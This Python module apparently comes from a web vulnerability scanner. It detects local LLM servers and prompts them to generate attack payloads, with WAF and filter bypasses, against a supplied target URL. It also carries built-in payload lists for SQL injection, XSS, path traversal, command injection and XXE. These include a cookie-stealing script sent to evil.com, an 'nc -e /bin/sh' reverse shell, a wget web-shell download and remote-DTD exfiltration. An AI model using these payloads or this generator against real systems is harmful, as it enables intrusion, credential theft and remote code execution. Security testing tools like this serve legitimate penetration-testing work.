#!/usr/bin/env python3
"""
LLM Manager
==========

Intelligent management of Large Language Models including:
- Automatic detection of local LLM models (Ollama, LM Studio, etc.)
- Optimized integration with various LLM providers
- Payload generation and evaluation strategies
- Fallback mechanisms and error handling
"""

import os
import json
import time
import requests
import subprocess
from typing import Dict, List, Optional, Any, Tuple
from dataclasses import dataclass
from enum import Enum
import logging
import asyncio
import threading
from concurrent.futures import ThreadPoolExecutor

logger = logging.getLogger(__name__)

class LLMProvider(Enum):
    """Supported LLM providers"""
    GEMINI = "gemini"
    OLLAMA = "ollama"
    LM_STUDIO = "lm_studio"
    OPENAI = "openai"
    LOCAL_API = "local_api"

@dataclass
class LLMModel:
    """LLM model information"""
    name: str
    provider: LLMProvider
    base_url: str
    api_key: str = ""
    context_window: int = 4096
    max_tokens: int = 1000
    is_available: bool = False
    last_checked: float = 0
    capabilities: List[str] = None

    def __post_init__(self):
        if self.capabilities is None:
            self.capabilities = []

class LLMManager:
    """Intelligent LLM management and payload generation"""

    def __init__(self):
        self.models: Dict[str, LLMModel] = {}
        self.executor = ThreadPoolExecutor(max_workers=3)
        self._detection_lock = threading.Lock()
        self._last_detection = 0
        self._detection_interval = 300  # 5 minutes

    def detect_local_models(self) -> Dict[str, LLMModel]:
        """Automatically detect all available local LLM models"""
        logger.info("Starting automatic LLM model detection...")

        with self._detection_lock:
            # Check if detection was done recently
            if time.time() - self._last_detection < self._detection_interval:
                logger.info("Using cached model detection results")
                return {name: model for name, model in self.models.items()
                       if model.is_available}

            self.models.clear()

            # Detect Ollama models
            self._detect_ollama_models()

            # Detect LM Studio models
            self._detect_lm_studio_models()

            # Detect other local API servers
            self._detect_local_api_servers()

            # Update detection timestamp
            self._last_detection = time.time()

            available_models = {name: model for name, model in self.models.items()
                              if model.is_available}

            logger.info(f"Model detection completed. Found {len(available_models)} available models")
            return available_models

    def _detect_ollama_models(self) -> None:
        """Detect Ollama models"""
        try:
            # Check if Ollama is running
            response = requests.get('http://localhost:11434/api/tags', timeout=5)
            if response.status_code == 200:
                models_data = response.json()
                for model in models_data.get('models', []):
                    model_name = model.get('name', '')
                    if model_name:
                        self.models[f"ollama/{model_name}"] = LLMModel(
                            name=model_name,
                            provider=LLMProvider.OLLAMA,
                            base_url='http://localhost:11434',
                            is_available=True,
                            last_checked=time.time(),
                            capabilities=['payload_generation', 'code_analysis', 'text_generation']
                        )
                logger.info(f"Detected {len(self.models)} Ollama models")
        except Exception as e:
            logger.warning(f"Ollama detection failed: {e}")

    def _detect_lm_studio_models(self) -> None:
        """Detect LM Studio models"""
        common_ports = [1234, 5000, 8000, 8080]

        for port in common_ports:
            try:
                # Try to detect LM Studio API
                response = requests.get(f'http://localhost:{port}/v1/models', timeout=3)
                if response.status_code == 200:
                    models_data = response.json()
                    for model in models_data.get('data', []):
                        model_id = model.get('id', '')
                        if model_id:
                            self.models[f"lm_studio/{model_id}"] = LLMModel(
                                name=model_id,
                                provider=LLMProvider.LM_STUDIO,
                                base_url=f'http://localhost:{port}',
                                is_available=True,
                                last_checked=time.time(),
                                capabilities=['payload_generation', 'chat', 'completion']
                            )
                    logger.info(f"Detected LM Studio models on port {port}")
                    break  # Found one, no need to check other ports
            except Exception:
                continue  # Try next port

    def _detect_local_api_servers(self) -> None:
        """Detect other local API servers"""
        common_ports = [8001, 8081, 5001]

        for port in common_ports:
            try:
                # Generic API detection
                response = requests.get(f'http://localhost:{port}/health', timeout=3)
                if response.status_code == 200:
                    # Try to get model info
                    try:
                        model_response = requests.get(f'http://localhost:{port}/v1/models', timeout=3)
                        if model_response.status_code == 200:
                            models_data = model_response.json()
                            for model in models_data.get('data', []):
                                model_id = model.get('id', 'unknown')
                                self.models[f"local_api/{model_id}"] = LLMModel(
                                    name=model_id,
                                    provider=LLMProvider.LOCAL_API,
                                    base_url=f'http://localhost:{port}',
                                    is_available=True,
                                    last_checked=time.time(),
                                    capabilities=['text_generation']
                                )
                    except Exception:
                        # Fallback for servers without model endpoint
                        self.models[f"local_api/generic_{port}"] = LLMModel(
                            name=f"Generic API (port {port})",
                            provider=LLMProvider.LOCAL_API,
                            base_url=f'http://localhost:{port}',
                            is_available=True,
                            last_checked=time.time(),
                            capabilities=['text_generation']
                        )
            except Exception:
                continue

    def generate_payloads(self, vulnerability_type: str, target_url: str,
                         context: str = "", model_name: Optional[str] = None) -> List[str]:
        """Generate sophisticated payloads using available LLMs"""
        payloads = []

        # Try to get available models
        available_models = self.detect_local_models()

        if not available_models:
            logger.warning("No local models available, falling back to default payloads")
            return self._get_default_payloads(vulnerability_type)

        # Try each available model
        for model_key, model in available_models.items():
            if model_name and model_key != model_name:
                continue

            try:
                if model.provider == LLMProvider.OLLAMA:
                    payloads = self._generate_ollama_payloads(model, vulnerability_type, target_url, context)
                elif model.provider == LLMProvider.LM_STUDIO:
                    payloads = self._generate_lm_studio_payloads(model, vulnerability_type, target_url, context)
                elif model.provider == LLMProvider.LOCAL_API:
                    payloads = self._generate_local_api_payloads(model, vulnerability_type, target_url, context)

                if payloads:
                    logger.info(f"Successfully generated {len(payloads)} payloads using {model_key}")
                    break

            except Exception as e:
                logger.warning(f"Failed to generate payloads with {model_key}: {e}")
                continue

        # Fallback to defaults if no payloads generated
        if not payloads:
            logger.warning("All LLM providers failed, using default payloads")
            payloads = self._get_default_payloads(vulnerability_type)

        return payloads[:10]  # Limit to 10 payloads

    def _generate_ollama_payloads(self, model: LLMModel, vulnerability_type: str,
                                target_url: str, context: str) -> List[str]:
        """Generate payloads using Ollama"""
        prompt = self._create_payload_prompt(vulnerability_type, target_url, context)

        response = requests.post(f'{model.base_url}/api/generate',
                               json={
                                   'model': model.name,
                                   'prompt': prompt,
                                   'stream': False,
                                   'options': {
                                       'temperature': 0.7,
                                       'top_p': 0.9
                                   }
                               }, timeout=30)

        if response.status_code == 200:
            result = response.json()
            payloads = [p.strip() for p in result['response'].split('\n') if p.strip()]
            return payloads

        raise Exception(f"Ollama API returned status {response.status_code}")

    def _generate_lm_studio_payloads(self, model: LLMModel, vulnerability_type: str,
                                   target_url: str, context: str) -> List[str]:
        """Generate payloads using LM Studio"""
        prompt = self._create_payload_prompt(vulnerability_type, target_url, context)

        response = requests.post(f'{model.base_url}/v1/completions',
                               json={
                                   'model': model.name,
                                   'prompt': prompt,
                                   'max_tokens': 500,
                                   'temperature': 0.7,
                                   'top_p': 0.9
                               }, timeout=30)

        if response.status_code == 200:
            result = response.json()
            generated_text = result['choices'][0]['text']
            payloads = [p.strip() for p in generated_text.split('\n') if p.strip()]
            return payloads

        raise Exception(f"LM Studio API returned status {response.status_code}")

    def _generate_local_api_payloads(self, model: LLMModel, vulnerability_type: str,
                                   target_url: str, context: str) -> List[str]:
        """Generate payloads using generic local API"""
        prompt = self._create_payload_prompt(vulnerability_type, target_url, context)

        response = requests.post(f'{model.base_url}/v1/completions',
                               json={
                                   'prompt': prompt,
                                   'max_tokens': 500,
                                   'temperature': 0.7
                               }, timeout=30)

        if response.status_code == 200:
            result = response.json()
            generated_text = result.get('text', result.get('response', ''))
            payloads = [p.strip() for p in generated_text.split('\n') if p.strip()]
            return payloads

        raise Exception(f"Local API returned status {response.status_code}")

    def _create_payload_prompt(self, vulnerability_type: str, target_url: str, context: str) -> str:
        """Create intelligent prompt for payload generation"""
        return f"""Generate 10 sophisticated {vulnerability_type} payloads for testing the URL: {target_url}

Context: {context}

Requirements:
1. Include both basic and advanced payloads
2. Consider different encoding methods (URL, HTML, Unicode, Base64, etc.)
3. Include bypass techniques for common security filters (WAF, input validation)
4. Make payloads context-aware and specific to the vulnerability type
5. Include payloads that test for different scenarios and edge cases
6. Consider the target technology stack and common vulnerabilities
7. Include time-based and boolean-based payloads where applicable
8. Ensure payloads are properly formatted and escaped

Return only the payloads, one per line, without explanations or numbering:
"""

    def _get_default_payloads(self, vulnerability_type: str) -> List[str]:
        """Default payloads for different vulnerability types"""
        payloads = {
            'sql_injection': [
                "' OR '1'='1",
                "'; DROP TABLE users; --",
                "' UNION SELECT NULL,NULL,NULL--",
                "admin'--",
                "' OR 1=1#",
                "') OR ('1'='1",
                "' WAITFOR DELAY '0:0:5'--",
                "'; EXEC xp_cmdshell('dir'); --",
                "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
                "' OR SLEEP(5)--",
                "' UNION SELECT database(),user(),version()--",
                "' AND 1=0 UNION SELECT schema_name FROM information_schema.schemata--",
                "'; IF (1=1) WAITFOR DELAY '0:0:5'--"
            ],
            'xss': [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "javascript:alert('XSS')",
                "<svg onload=alert('XSS')>",
                "'\"><script>alert('XSS')</script>",
                "<iframe src=javascript:alert('XSS')>",
                "<body onload=alert('XSS')>",
                "<script>document.location='http://evil.com/'+document.cookie</script>",
                "<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>",
                "<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert('XSS')\">",
                "<script>window.location='javascript:alert(1)'</script>",
                "<input onfocus=alert(1) autofocus>",
                "<div onmouseover=\"alert('XSS')\">Hover me</div>",
                "<style>body{ background-image: url('javascript:alert(1)') }</style>"
            ],
            'lfi': [
                "../../../etc/passwd",
                "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
                "....//....//....//etc/passwd",
                "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                "..%252f..%252f..%252fetc%252fpasswd",
                "php://filter/read=convert.base64-encode/resource=index.php",
                "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==",
                "/proc/self/environ",
                "expect://id",
                "file:///etc/passwd",
                "../../../etc/shadow",
                "../../../var/log/apache2/access.log",
                "../../../home/user/.ssh/id_rsa",
                "php://input",
                "zip://shell.php%23payload",
                "phar://test.phar/test.txt"
            ],
            'command_injection': [
                "; ls -la",
                "| whoami",
                "& dir",
                "; cat /etc/passwd",
                "| id",
                "; wget http://evil.com/shell.php",
                "`whoami`",
                "$(id)",
                "; nc -e /bin/sh evil.com 4444",
                "| curl http://evil.com/$(whoami)",
                "; ping -c 4 127.0.0.1",
                "& timeout 10",
                "; sleep 5",
                "| base64 -d",
                "; echo 'test' > /tmp/test",
                "$(cat /etc/passwd)",
                "; id; uname -a; date",
                "& whoami && echo 'success'"
            ],
            'xxe': [
                '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
                '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///c:/windows/win.ini">]><root>&test;</root>',
                '<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://evil.com/evil.dtd"> %xxe;]>',
                '<?xml version="1.0"?><!DOCTYPE data SYSTEM "http://evil.com/evil.dtd"><data>&send;</data>',
                '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=index.php">]><foo>&xxe;</foo>',
                '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % payload SYSTEM "file:///etc/passwd"> %payload;]>',
                '<!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/shadow">]><root>&test;</root>',
                '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">&#x25; file;]><root>&file;</root>',
                '<!DOCTYPE root [<!ENTITY % remote SYSTEM "http://evil.com/malicious.xml"> %remote;]>'
            ]
        }
        return payloads.get(vulnerability_type, [])

    def get_model_info(self, model_name: str) -> Optional[LLMModel]:
        """Get information about a specific model"""
        return self.models.get(model_name)

    def test_model_availability(self, model: LLMModel) -> bool:
        """Test if a model is currently available"""
        try:
            if model.provider == LLMProvider.OLLAMA:
                response = requests.get(f'{model.base_url}/api/tags', timeout=5)
                model.is_available = response.status_code == 200
            elif model.provider == LLMProvider.LM_STUDIO:
                response = requests.get(f'{model.base_url}/v1/models', timeout=5)
                model.is_available = response.status_code == 200
            else:
                response = requests.get(f'{model.base_url}/health', timeout=5)
                model.is_available = response.status_code == 200

            model.last_checked = time.time()
            return model.is_available

        except Exception as e:
            logger.warning(f"Model {model.name} availability test failed: {e}")
            model.is_available = False
            model.last_checked = time.time()
            return False

    def cleanup(self):
        """Cleanup resources"""
        self.executor.shutdown(wait=True)

# Global LLM manager instance
llm_manager = LLMManager()